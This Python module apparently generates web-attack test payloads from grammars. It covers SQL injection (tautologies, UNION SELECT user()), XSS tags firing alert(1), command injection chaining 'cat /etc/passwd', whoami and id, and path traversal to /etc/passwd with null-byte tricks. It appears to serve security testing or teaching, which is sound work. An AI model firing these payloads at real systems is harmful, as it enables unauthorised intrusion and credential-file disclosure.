import random
from typing import Dict, List, Union
from app.generation.ast import GrammarNode

# BNF grammars for the 4 educational vulnerability categories
GRAMMAR_DEFINITIONS: Dict[str, Dict[str, List[List[Union[str, tuple]]]]] = {
    "sqli": {
        "<start>": [
            [("<prefix>", "<operator>", "<tautology>", "<comment_suffix>")],
            [("<prefix>", "<operator>", "<tautology>")],
            [("<prefix>", "<union_clause>", "<comment_suffix>")],
        ],
        "<prefix>": [
            ["1' "],
            ["' "],
            ['1" '],
            ["admin' "],
            ["1 "],
        ],
        "<operator>": [
            ["OR "],
            ["|| "],
            ["AND "],
        ],
        "<tautology>": [
            ["'1'='1'"],
            ["1=1"],
            ["'a'='a'"],
            ["2>1"],
            ["'x' LIKE 'x'"],
            ["(1=1)"],
        ],
        "<union_clause>": [
            ["UNION SELECT null, null"],
            ["UNION SELECT 1, user()"],
            ["UNION ALL SELECT null, version()"],
            ["UNION SELECT 1, 2"],
        ],
        "<comment_suffix>": [
            [" #"],
            [" -- "],
            [" -- -"],
            [" /*!50000 */"],
            [" /**/"],
        ],
    },
    "xss": {
        "<start>": [
            [("<script_tag>")],
            [("<event_tag>")],
            [("<prefix_escape>", "<script_tag>")],
            [("<prefix_escape>", "<event_tag>")],
        ],
        "<prefix_escape>": [
            ['">'],
            ["'>"],
            ["</title>"],
            ["-->"],
        ],
        "<script_tag>": [
            ["<script>", ("<js_payload>"), "</script>"],
            ["<script ", ("<attr_slot>"), ">", ("<js_payload>"), "</script>"],
        ],
        "<event_tag>": [
            ["<img src=x ", ("<event_handler>"), "=>", ("<js_payload>"), ">"],
            ["<svg ", ("<event_handler>"), "=>", ("<js_payload>"), ">"],
            ["<body ", ("<event_handler>"), "=>", ("<js_payload>"), ">"],
            ["<input autofocus ", ("<event_handler>"), "=>", ("<js_payload>"), ">"],
        ],
        "<event_handler>": [
            ["onerror"],
            ["onload"],
            ["onfocus"],
            ["onmouseover"],
        ],
        "<attr_slot>": [
            ["type=text/javascript"],
            ["defer"],
            ["async"],
        ],
        "<js_payload>": [
            ["alert(1)"],
            ["alert('CR_TEST')"],
            ["confirm(1)"],
            ["prompt(1)"],
            ["console.log(1)"],
        ],
    },
    "cmdi": {
        "<start>": [
            [("<separator>", "<command>")],
            [("<separator>", "<command>", "<terminator>")],
        ],
        "<separator>": [
            [" && "],
            ["; "],
            [" | "],
            [" || "],
            ["\n"],
        ],
        "<command>": [
            [("<cmd_name>", " ", "<cmd_arg>")],
            [("<cmd_name>")],
        ],
        "<cmd_name>": [
            ["echo"],
            ["id"],
            ["whoami"],
            ["uname"],
            ["cat"],
        ],
        "<cmd_arg>": [
            ["CR_TEST_PING"],
            ["-a"],
            ["/etc/passwd"],
            ["$USER"],
            ["1"],
        ],
        "<terminator>": [
            [" #"],
            [";"],
            [" && true"],
        ],
    },
    "path_traversal": {
        "<start>": [
            [("<depth_seq>", "<target_file>")],
            [("<depth_seq>", "<target_file>", "<null_bypass>")],
            [("<root_path>")],
        ],
        "<depth_seq>": [
            ["../../../../"],
            ["../../../"],
            ["../../../../../"],
            ["....//....//....//"],
            ["..%2f..%2f..%2f"],
        ],
        "<target_file>": [
            ["etc/passwd"],
            ["windows/win.ini"],
            ["etc/hosts"],
            ["etc/issue"],
        ],
        "<root_path>": [
            ["/etc/passwd"],
            ["/etc/hosts"],
            ["/etc/issue"],
        ],
        "<null_bypass>": [
            ["%00"],
            ["%00.php"],
            ["%20"],
        ],
    },
}


class GrammarEngine:
    """Expands BNF grammars into AST derivation trees."""

    def __init__(self, definitions: Dict = GRAMMAR_DEFINITIONS, seed: int = None) -> None:
        self.definitions = definitions
        self.rng = random.Random(seed)

    def set_seed(self, seed: int) -> None:
        self.rng.seed(seed)

    def expand(self, category: str, rule: str = "<start>", max_depth: int = 8) -> GrammarNode:
        """Expands a grammar rule recursively into an AST."""
        category_grammar = self.definitions.get(category)
        if not category_grammar:
            raise ValueError(f"Unknown grammar category: {category}")

        node = GrammarNode(rule_name=rule)
        if max_depth <= 0 or rule not in category_grammar:
            # Fallback if depth limit hit or terminal
            node.children = [rule.strip("<>")]
            return node

        productions = category_grammar[rule]
        chosen_production = self.rng.choice(productions)

        for element in chosen_production:
            if isinstance(element, tuple):
                for sub_rule in element:
                    child_node = self.expand(category, sub_rule, max_depth - 1)
                    node.children.append(child_node)
            elif isinstance(element, str) and element.startswith("<") and element.endswith(">"):
                child_node = self.expand(category, element, max_depth - 1)
                node.children.append(child_node)
            else:
                node.children.append(element)

        return node

    def re_expand_rule(self, category: str, rule_name: str) -> GrammarNode:
        """Generates a fresh subtree for an existing rule name."""
        return self.expand(category, rule=rule_name, max_depth=5)
